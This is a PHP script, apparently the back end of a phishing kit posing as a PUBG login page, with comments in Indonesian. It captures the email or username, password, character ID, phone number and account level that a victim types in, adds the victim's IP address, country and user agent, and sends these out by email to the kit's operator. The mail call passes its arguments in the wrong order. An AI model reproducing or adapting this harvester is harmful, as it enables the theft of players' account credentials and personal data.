<?php
// LICENSE GUI GPLV3 BOT BY SCHT DEV

// MENGAMBIL KONTROL
include 'system/setting.php';
include 'email.php';


// TES BETA DETEC
$ip = getenv("REMOTE_ADDR");
$code = $_SESSION['ip_countryCode']=clientData('code');
$country = strtolower($code);
$useragent = $_SERVER['HTTP_USER_AGENT'];

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$nick = $_POST['nick'];
$playid = $_POST['playid'];
$phone = $_POST['phone'];
$level = $_POST['level'];
$tier = $_POST['tier'];
$rpt = $_POST['rpt'];
$rpl = $_POST['rpl'];
$platform = $_POST['platform'];
$login = $_POST['login'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $nick == "" && $playid == "" && $phone == "" && $level == "" && $tier == "" && $rpt == "" && $rpl == "" && $platform == "" && $login == ""){
header("Location: index.php");
}else{

// KONTEN RESULT AKUN
$subjek = "$sender | ACC PUBG | LOGIN $login";
$pesan = '
'.$subjek.'
EMAIL/PHONE/USERNAME: '.$email.'
PASSWORD: '.$password.'
CHARACTER ID: '.$playid.'
PHONE NUMBER: '.$phone.'
ACCOUNT LEVEL: '.$level.'

Additional Information
IP ADDRESS: '.$ip.'
COUNTRY: '.$country.'
USER-AGENT: '.$useragent.'
LOGIN TIME: '.$jamasuk.'
AUTHOR: '.$author.'
';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$kirim = mail($subjek, $pesan, $headers);
include 'system/myapi.php';
}
?>